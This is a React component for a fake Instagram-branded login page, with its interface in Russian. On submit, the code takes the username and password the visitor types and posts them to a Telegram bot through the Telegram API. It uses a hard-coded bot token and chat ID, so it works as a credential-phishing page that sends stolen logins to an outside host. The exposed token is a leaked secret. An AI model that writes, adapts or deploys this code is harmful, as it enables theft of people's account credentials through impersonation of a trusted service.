import React, { useState } from 'react';
import logo from './assets/instagram.png'; // Импорт логотипа, если нужно


const TOKEN = '7868471336:AAEmJlfqkkrfhLQaj7gKk2iZtucUrEODXRw'; // ⚠️ НЕ публикуй в публичных репозиториях
const CHAT_ID = '-1002737636573';
const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const LoginPage = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    const message = `🔐 Новая попытка входа:\n👤 Username: ${username}\n🔑 Password: ${password}`;

    try {
      await fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      });
    } catch (error) {
      alert('Ошибка отправки');
      console.error(error);
    }

    setUsername('');
    setPassword('');
  };

  return (
    <div className="min-h-screen flex items-center justify-center">
      <div className="w-full max-w-md">
        <div className="lg:border border-gray-300 bg-white p-8">
            <img src={logo} alt="" className='mx-auto my-[100px]' />
          <form className="space-y-4 w-full" onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Телефон, имя пользователя или эл. адрес"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full border border-gray-300 px-3 py-2 rounded bg-gray-50 focus:outline-none text-sm"
            />
            <input
              type="password"
              placeholder="Пароль"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full border border-gray-300 px-3 py-2 rounded bg-gray-50 focus:outline-none text-sm"
            />
            <div className='flex justify-end'>
                <a className='text-[#1877F2] ' href="#">Забыли пароль?</a>
            </div>
            <button
              type="submit"
              className="w-full bg-[#1877F2] text-white py-2 rounded-[6px] font-medium hover:bg-blue-600 transition"
            >
              Войти
            </button>
            <p className='mt-[30px] text-center'>Нет аккаунта? <span className='text-[#267FF3]'>Зарегестрироваться</span></p>
          </form>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
